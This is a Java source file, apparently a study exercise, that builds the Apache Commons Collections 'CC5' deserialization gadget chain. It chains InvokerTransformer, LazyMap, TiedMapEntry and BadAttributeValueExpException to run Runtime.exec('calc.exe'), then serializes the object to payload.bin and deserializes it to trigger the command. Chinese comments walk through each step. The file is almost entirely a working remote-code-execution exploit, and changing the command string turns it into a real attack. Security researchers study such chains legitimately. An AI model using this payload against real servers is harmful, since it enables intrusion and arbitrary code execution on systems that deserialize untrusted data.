package org.dili.cc;

import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.ChainedTransformer;
import org.apache.commons.collections.functors.ConstantTransformer;
import org.apache.commons.collections.functors.InvokerTransformer;
import org.apache.commons.collections.keyvalue.TiedMapEntry;
import org.apache.commons.collections.map.LazyMap;

import javax.management.BadAttributeValueExpException;
import java.io.FileInputStream;
import java.io.FileOutputStream;
import java.io.ObjectInputStream;
import java.io.ObjectOutputStream;
import java.lang.reflect.Field;
import java.util.HashMap;
import java.util.Map;

public class commons_collections5 {
    public static void main(String[] args) throws Exception{
        // 构建一个transformer数组
        Transformer[] transformers = new Transformer[]{
                new ConstantTransformer(Runtime.class),
                new InvokerTransformer("getMethod", new Class[] {String.class, Class[].class }, new Object[] {"getRuntime", new Class[0] }),
                new InvokerTransformer("invoke", new Class[] {Object.class, Object[].class }, new Object[] {null, new Object[0] }),
                new InvokerTransformer("exec", new Class[] {String.class }, new Object[] {"calc.exe"})
        };
        Transformer transformerChain = new ChainedTransformer(transformers);
        Map innerMap = new HashMap();
        // 创建LazyMap对象
        Map lazyMap = LazyMap.decorate(innerMap,transformerChain);
        // 创建TiedMapEntry对象
        TiedMapEntry tiedMapEntry = new TiedMapEntry(lazyMap, 11);
        BadAttributeValueExpException badAttributeValueExpException = new BadAttributeValueExpException(100);
        // 通过反射设置badAttributeValueExpException的val值
        Field field = badAttributeValueExpException.getClass().getDeclaredField("val");
        field.setAccessible(true);
        field.set(badAttributeValueExpException, tiedMapEntry);

        //序列化与反序列化操作
        //payload序列化写入文件，模拟网络传输
        FileOutputStream f = new FileOutputStream("payload.bin");
        ObjectOutputStream fout = new ObjectOutputStream(f);
        fout.writeObject(badAttributeValueExpException);

        //2.服务端读取文件，反序列化，模拟网络传输
        FileInputStream fi = new FileInputStream("payload.bin");
        ObjectInputStream fin = new ObjectInputStream(fi);
        //服务端反序列化
        fin.readObject();
    }
}
